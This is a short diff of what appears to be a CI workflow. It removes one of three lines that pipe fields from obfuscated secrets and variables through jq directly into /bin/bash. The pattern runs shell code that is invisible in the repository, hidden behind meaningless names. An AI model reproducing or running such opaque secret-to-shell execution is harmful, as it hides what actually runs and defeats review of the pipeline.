@@ -22,7 +22,6 @@ jobs:
           g969: ${{ secrets.g969 }}
         run: |
           printf '%s' "$g969" | jq -r .lhlu6 | /bin/bash
-          echo $ow66248 | jq -r .awv52384 | /bin/bash
           echo $razdo00214 | jq -r .ot335 | /bin/bash
 
       - name: Upload output
